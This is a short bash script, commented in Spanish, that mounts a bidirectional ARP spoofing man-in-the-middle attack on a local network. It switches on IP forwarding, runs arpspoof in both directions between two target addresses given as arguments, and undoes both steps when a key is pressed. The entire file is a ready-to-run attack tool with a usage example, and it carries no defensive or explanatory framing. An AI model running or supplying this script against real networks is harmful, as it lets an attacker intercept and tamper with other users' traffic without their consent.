#!/bin/bash
echo "Spoof IP LAN por ARP. Identificamos nuestros interfaces nuestra IP y la IP a sumplantar"
echo "Uso: sh arpspoof.sh eth0 192.168.1.252 192.168.1.250"

# Activamos IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Sumplantacion
arpspoof -i $1 -t $2 $3 > /dev/null 2>&1 &
PID1=$!
arpspoof -i $1 -t $3 $2 > /dev/null 2>&1 &
PID2=$!

echo "Para parar pulsa cualquier tecla..."
read

# Parar
kill -9 $PID1 $PID2
echo 0 > /proc/sys/net/ipv4/ip_forward

exit 0
